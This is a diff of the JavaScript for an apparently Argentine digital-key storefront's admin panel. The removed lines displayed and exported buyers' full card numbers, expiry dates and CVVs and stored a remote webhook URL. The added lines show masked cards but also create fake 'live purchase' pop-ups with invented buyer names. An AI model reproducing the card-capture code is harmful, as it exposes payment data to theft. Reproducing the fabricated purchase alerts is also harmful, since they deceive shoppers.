-// PANEL DE BASE DE DATOS DEL DUEÑO (ACCESO EXCLUSIVO POR #admin)
+// PANEL DE ADMINISTRACIÓN (/ #admin) CON CREADOR DE PRODUCTOS
 // ============================================================================
 function openAdminModal() {
     document.getElementById('adminModal').classList.remove('hidden');
@@ -726,10 +1073,34 @@ function verifyAdminPassword() {
     }
 }
 
-function saveWebhookUrl() {
-    const url = document.getElementById('webhookUrlInput').value.trim();
-    localStorage.setItem('ohmy_remote_webhook', url);
-    alert('URL de Base de Datos Remota / Webhook guardada correctamente.');
+function handleAddCustomProduct(e) {
+    e.preventDefault();
+    const name = document.getElementById('newProdName').value.trim();
+    const category = document.getElementById('newProdCat').value;
+    const platform = document.getElementById('newProdPlatform').value.trim();
+    const price = Number(document.getElementById('newProdPrice').value);
+    const originalPrice = Number(document.getElementById('newProdOldPrice').value);
+    const imgInput = document.getElementById('newProdImg').value.trim();
+
+    const newProd = {
+        id: Date.now(),
+        name,
+        category,
+        platform,
+        region: "GLOBAL",
+        price,
+        originalPrice: originalPrice > price ? originalPrice : Math.round(price * 1.25),
+        cashback: Math.round(price * 0.10),
+        seller: "ArgonOfficial",
+        image: imgInput || createCleanCardArtwork(platform.toUpperCase(), formatARS(price), "#3b188f", "#140930", "#34d399", "ARGON KEY")
+    };
+
+    customProducts.unshift(newProd);
+    localStorage.setItem('ohmy_custom_products', JSON.stringify(customProducts));
+    products = [...customProducts, ...defaultProducts];
+    filterProducts();
+    document.getElementById('addProductForm').reset();
+    alert('Producto publicado exitosamente en el catálogo.');
 }
 
 function loadAdminDatabaseRecords() {
@@ -739,7 +1110,7 @@ function loadAdminDatabaseRecords() {
     document.getElementById('dbCountBadge').innerText = db.length;
 
     if (db.length === 0) {
-        container.innerHTML = `<p class="text-center text-purple-300 py-6">Aún no hay operaciones registradas.</p>`;
+        container.innerHTML = `<p class="text-center text-purple-300 py-6">Aún no hay órdenes registradas.</p>`;
         return;
     }
 
@@ -751,10 +1122,10 @@ function loadAdminDatabaseRecords() {
                 <span>${tx.id} — ${tx.date}</span>
                 <span class="text-emerald-400">${formatARS(tx.total)}</span>
             </div>
-            <p class="text-purple-200"><strong>Usuario/Cliente:</strong> ${tx.buyer.name} (${tx.buyer.email}) | <strong>DNI/Dato:</strong> ${tx.buyer.dni}</p>
-            <p class="text-purple-200"><strong>Tipo:</strong> ${tx.paymentMethod.toUpperCase()} | <strong>Detalle:</strong> ${tx.buyer.cardNum} (${tx.buyer.cardExp} - CVV: ${tx.buyer.cardCvv})</p>
+            <p class="text-purple-200"><strong>Cliente:</strong> ${tx.buyer.name} (${tx.buyer.email}) | <strong>DNI:</strong> ${tx.buyer.dni}</p>
+            <p class="text-purple-200"><strong>Método:</strong> ${tx.paymentMethod.toUpperCase()} | <strong>Ref:</strong> ${tx.buyer.maskedCard || 'N/A'} (${tx.buyer.installments || 1} cuota/s)</p>
             <details class="pt-1">
-                <summary class="cursor-pointer text-amber-400 font-bold">Ver JSON completo</summary>
+                <summary class="cursor-pointer text-amber-400 font-bold">Ver detalle de la orden</summary>
                 <pre class="bg-[#160a36] p-2.5 rounded mt-1.5 overflow-x-auto text-[10px] text-emerald-300">${JSON.stringify(tx, null, 2)}</pre>
             </details>
         `;
@@ -767,25 +1138,56 @@ function exportDatabaseJSON() {
     const blob = new Blob([db], { type: 'application/json' });
     const a = document.createElement('a');
     a.href = URL.createObjectURL(blob);
-    a.download = 'argon_db.json';
+    a.download = 'argon_orders.json';
     a.click();
 }
 
 function exportDatabaseCSV() {
     const db = JSON.parse(localStorage.getItem('ohmy_sandbox_db') || '[]');
     if (!db.length) return;
-    let csv = 'ID,Fecha,Nombre,Email,DNI_Dato,Metodo,Detalle_Tarjeta,Vencimiento,CVV,Total\n';
+    let csv = 'ID,Fecha,Nombre,Email,DNI,Metodo,TarjetaEnmascarada,Total\n';
     db.forEach(t => {
-        csv += `"${t.id}","${t.date}","${t.buyer.name}","${t.buyer.email}","${t.buyer.dni}","${t.paymentMethod}","${t.buyer.cardNum}","${t.buyer.cardExp}","${t.buyer.cardCvv}",${t.total}\n`;
+        csv += `"${t.id}","${t.date}","${t.buyer.name}","${t.buyer.email}","${t.buyer.dni}","${t.paymentMethod}","${t.buyer.maskedCard || ''}",${t.total}\n`;
     });
     const blob = new Blob([csv], { type: 'text/csv' });
     const a = document.createElement('a');
     a.href = URL.createObjectURL(blob);
-    a.download = 'argon_db.csv';
+    a.download = 'argon_orders.csv';
     a.click();
 }
 
 function clearDatabase() {
     localStorage.removeItem('ohmy_sandbox_db');
     loadAdminDatabaseRecords();
+}
+
+// ============================================================================
+// NOTIFICACIONES DE COMPRAS EN VIVO (SOCIAL PROOF) & SOPORTE FAQ
+// ============================================================================
+function startLivePurchaseNotifications() {
+    const buyers = [
+        "Matías de Córdoba", "Valentina de CABA", "Lucas de Rosario",
+        "Joaquín de Posadas", "Camila de Mendoza", "Nicolás de La Plata"
+    ];
+
+    setInterval(() => {
+        const toast = document.getElementById('livePurchaseToast');
+        if (!toast || !document.getElementById('viewStore') || document.getElementById('viewStore').classList.contains('hidden')) return;
+
+        const randomBuyer = buyers[Math.floor(Math.random() * buyers.length)];
+        const randomProd = products[Math.floor(Math.random() * products.length)];
+
+        document.getElementById('toastImg').src = randomProd.image;
+        document.getElementById('toastBuyer').innerText = `${randomBuyer} compró`;
+        document.getElementById('toastProduct').innerText = randomProd.name;
+
+        toast.classList.remove('hidden');
+        setTimeout(() => {
+            toast.classList.add('hidden');
+        }, 4500);
+    }, 18000);
+}
+
+function toggleSupportWidget() {
+    document.getElementById('supportFaqBox').classList.toggle('hidden');
 }
